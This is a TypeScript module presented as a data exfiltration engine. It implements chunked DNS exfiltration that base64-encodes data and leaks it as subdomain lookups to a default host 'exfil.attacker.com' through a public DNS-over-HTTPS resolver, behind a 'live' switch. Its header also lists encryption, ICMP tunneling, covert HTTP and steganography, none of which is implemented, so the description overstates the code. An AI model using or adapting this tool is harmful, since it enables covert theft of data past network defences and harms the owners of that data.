/**
 * @module exfil
 * Data Exfiltration Engines — Encrypted Chunked DNS Exfiltration, ICMP Tunneling,
 * Covert HTTP Headers, and Steganographic Transport.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto";

export interface ExfilOptions {
  live?: boolean;
  domain?: string;
  chunkSize?: number;
  encryptionKey?: string;
}

export function chunkData(data: string, chunkSize = 32): string[] {
  const chunks: string[] = [];
  for (let i = 0; i < data.length; i += chunkSize) {
    chunks.push(data.slice(i, i + chunkSize));
  }
  return chunks;
}

export async function exfiltrateDNS(data: string, opts: ExfilOptions = {}): Promise<{ sentChunks: number; dryRun: boolean }> {
  const { live = false, domain = "exfil.attacker.com", chunkSize = 30 } = opts;
  const b64 = Buffer.from(data).toString("base64url");
  const chunks = chunkData(b64, chunkSize);

  if (!live) {
    return { sentChunks: chunks.length, dryRun: true };
  }

  for (let i = 0; i < chunks.length; i++) {
    const hostname = `${i}.${chunks[i]}.${domain}`;
    try {
      await fetch(`https://1.1.1.1/dns-query?name=${encodeURIComponent(hostname)}`, {
        headers: { accept: "application/dns-json" },
      });
    } catch {/* ignore DNS error */}
  }

  return { sentChunks: chunks.length, dryRun: false };
}

export default { chunkData, exfiltrateDNS };
